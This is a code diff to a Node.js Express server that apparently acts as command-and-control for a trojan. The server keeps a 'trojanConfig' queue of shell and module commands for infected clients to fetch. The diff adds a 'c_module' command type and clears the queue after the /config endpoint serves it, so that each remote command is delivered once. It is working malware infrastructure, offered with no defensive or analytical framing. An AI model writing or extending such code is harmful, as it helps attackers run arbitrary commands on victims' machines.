@@ -13,7 +13,7 @@ app.use(bodyParser.json());
 
 app.post('/send-command', (req, res) => {
     const command = req.body;
-    if (command && (command.type === 'shell' || command.type === 'module') && (command.command || command.module)) {
+    if (command && (command.type === 'shell' || command.type === 'module' || command.type === 'c_module') && (command.command || command.module)) {
         trojanConfig.commands.push(command);
         console.log(`Command added: ${JSON.stringify(command)}`);
         res.status(200).json({ message: 'Command received', command });
@@ -25,6 +25,9 @@ app.post('/send-command', (req, res) => {
 
 app.get('/config', (req, res) => {
     res.status(200).json(trojanConfig);
+
+    // Clear the commands after they are sent
+    trojanConfig.commands = [];
 });
 
 app.post('/command', (req, res) => {
